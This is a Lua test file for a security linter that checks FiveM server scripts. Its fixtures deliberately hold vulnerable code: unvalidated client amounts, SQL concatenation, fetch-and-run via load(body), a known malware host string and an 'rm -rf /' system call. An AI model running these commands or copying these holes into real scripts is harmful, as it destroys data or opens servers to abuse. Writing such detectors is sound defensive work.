local t = require("spec.harness")
local S = require("spec.support")

t.describe("security", function()
  t.describe("FX400 unvalidated-net-input", function()
    t.it("flags a client amount reaching the economy", function()
      local f = S.of("FX400", [[
        RegisterNetEvent('shop:pay', function(amount)
          local xPlayer = ESX.GetPlayerFromId(source)
          xPlayer.addMoney(amount)
        end)
      ]])
      t.eq(#f, 1)
      t.truthy(f[1].message:find("'amount'"))
      t.eq(f[1].severity, "critical")
    end)

    t.it("follows the value through locals and fields", function()
      t.eq(S.count("FX400", [[
        RegisterNetEvent('a', function(data)
          local n = data.amount * 2
          local m = n
          Player.addMoney(m)
        end)
      ]]), 1)
    end)

    t.it("links RegisterNetEvent and AddEventHandler across files", function()
      local extra = { files = { { path = "b.lua", source = "RegisterNetEvent('a')", side = "server" } } }
      t.eq(S.count("FX400", "AddEventHandler('a', function(x) P.addMoney(x) end)", "server", extra), 1)
    end)

    t.it("ignores handlers that are not client-callable", function()
      t.eq(S.count("FX400", "AddEventHandler('a', function(x) P.addMoney(x) end)"), 0)
    end)

    t.it("accepts validated values", function()
      t.eq(S.count("FX400", [[
        RegisterNetEvent('a', function(amount)
          if type(amount) ~= 'number' or amount <= 0 then return end
          P.addMoney(amount)
        end)
      ]]), 0)
    end)

    t.it("does not treat a truthiness test as validation", function()
      t.eq(S.count("FX400", [[
        RegisterNetEvent('a', function(amount)
          if amount then P.addMoney(amount) end
        end)
      ]]), 1)
    end)

    t.it("accepts values read from server config", function()
      t.eq(S.count("FX400", [[
        RegisterNetEvent('a', function(item)
          P.addMoney(Config.Prices[item])
        end)
      ]]), 0)
    end)

    t.it("skips trusted callback parameters", function()
      t.eq(S.count("FX400", "lib.callback.register('a', function(source) P.addMoney(source) end)"), 0)
      t.eq(S.count("FX400", "lib.callback.register('a', function(source, n) P.addMoney(n) end)"), 1)
      t.eq(S.count("FX400", "ESX.RegisterServerCallback('a', function(source, cb, n) P.addMoney(n); cb() end)"), 1)
    end)

    t.it("flags ExecuteCommand", function()
      t.eq(S.count("FX400", "RegisterNetEvent('a', function(c) ExecuteCommand(c) end)"), 1)
    end)

    t.it("checks handlers given by name", function()
      t.eq(S.count("FX400", "local function h(n) P.addMoney(n) end\nRegisterNetEvent('a', h)"), 1)
    end)
  end)

  t.it("FX401 flags rewards without any condition", function()
    t.eq(S.count("FX401", "RegisterNetEvent('a', function() P.addMoney(1000) end)"), 1)
    t.eq(S.count("FX401", "RegisterNetEvent('a', function() if ok() then P.addMoney(1000) end end)"), 0)
  end)

  t.describe("FX402 source-after-yield", function()
    t.it("flags a read after Wait", function()
      t.eq(S.count("FX402", "RegisterNetEvent('a', function() Wait(10) print(source) end)"), 1)
    end)

    t.it("flags a read after await", function()
      t.eq(S.count("FX402", "RegisterNetEvent('a', function() local r = MySQL.query.await('x') print(r, source) end)"), 1)
    end)

    t.it("flags a read in a callback", function()
      t.eq(S.count("FX402", "RegisterNetEvent('a', function() MySQL.query('x', {}, function() print(source) end) end)"), 1)
    end)

    t.it("accepts the local copy", function()
      t.eq(S.count("FX402", "RegisterNetEvent('a', function() local src = source Wait(10) print(src) end)"), 0)
    end)
  end)

  t.it("FX403 flags dynamic code but not resource files", function()
    t.eq(S.count("FX403", "local s = GetConvar('a', '')\nload(s)()"), 1)
    t.eq(S.count("FX403", "load(LoadResourceFile('r', 'f.lua'))()"), 0)
    t.eq(S.count("FX403", "load('return 1')()"), 0)
  end)

  t.it("FX404 flags downloaded and client-supplied code", function()
    t.eq(S.count("FX404", "PerformHttpRequest('https://x', function(e, body) load(body)() end)"), 1)
    t.eq(S.count("FX404", "RegisterNetEvent('a', function(c) load(c)() end)"), 1)
  end)

  t.it("FX405 flags obfuscated code", function()
    local hidden = 'local a = "' .. string.rep("\\x41", 45) .. '"\nprint(a)'
    t.eq(S.count("FX405", hidden), 1)
    t.eq(S.count("FX405", 'print("a\\nb\\tc")'), 0)
    t.eq(S.count("FX405", "print(_G[string.char(1)], " .. string.rep("string.char(1), ", 5) .. "1)"), 1)
    t.eq(S.count("FX405", "print(" .. string.rep(" ", 20001) .. "1)"), 1)
  end)

  t.it("FX406 flags known malware, even escaped", function()
    t.eq(S.count("FX406", 'PerformHttpRequest("https://cipher-panel.me/x")'), 1)
    t.eq(S.count("FX406", 'print("\\x63ipher-panel")'), 1)
    t.eq(S.count("FX406", 'print("my cipher")'), 0)
  end)

  t.it("FX407 flags system commands", function()
    t.eq(S.count("FX407", "os.execute('rm -rf /')"), 1)
    t.eq(S.count("FX407", "io.popen('ls')"), 1)
  end)

  t.it("FX408 and FX409 separate exposed and server secrets", function()
    local hook = "Config = { Hook = 'https://discord.com/api/webhooks/123/abc' }"
    t.eq(S.count("FX408", hook, "client"), 1)
    t.eq(S.count("FX408", hook, "shared"), 1)
    t.eq(S.count("FX409", hook, "server"), 1)
    t.eq(S.count("FX408", hook, "server"), 0)
    t.eq(S.count("FX408", "Config = { apiKey = 'a1b2c3d4e5f6' }", "client"), 1)
    t.eq(S.count("FX408", "Config = { apiKey = 'YOUR_KEY_HERE' }", "client"), 0)
    t.eq(S.count("FX408", "Config = { tokenText = 'hello there' }", "client"), 0)
  end)

  t.describe("FX410 sql-injection", function()
    t.it("flags concatenation", function()
      local f = S.of("FX410", "local id = f()\nMySQL.query('SELECT * FROM a WHERE id = ' .. id)")
      t.eq(#f, 1)
      t.eq(f[1].severity, "high")
    end)

    t.it("is critical with client data", function()
      local f = S.of("FX410", "RegisterNetEvent('a', function(id) MySQL.query('SELECT ' .. id) end)")
      t.eq(#f, 1)
      t.eq(f[1].severity, "critical")
    end)

    t.it("accepts parameters and constants", function()
      t.eq(S.count("FX410", "MySQL.query('SELECT ?', { 1 })"), 0)
      t.eq(S.count("FX410", "MySQL.query('SELECT * FROM ' .. TABLE_NAME)"), 0)
    end)

    t.it("recognizes the exports syntax", function()
      t.eq(S.count("FX410", "local a = f()\nexports.oxmysql:query('x' .. a)"), 1)
    end)
  end)

  t.it("FX411 flags a client-supplied player id", function()
    t.eq(S.count("FX411", "RegisterNetEvent('a', function(target) DropPlayer(target, 'x') end)"), 1)
    t.eq(S.count("FX411", "RegisterNetEvent('a', function(target) if isAdmin(source, target) then DropPlayer(target, 'x') end end)"), 0)
  end)

  t.it("FX412 flags client-side prices", function()
    t.eq(S.count("FX412", "local price = 1\nTriggerServerEvent('buy', price)", "client"), 1)
    t.eq(S.count("FX412", "local item = 1\nTriggerServerEvent('buy', item)", "client"), 0)
  end)
end)
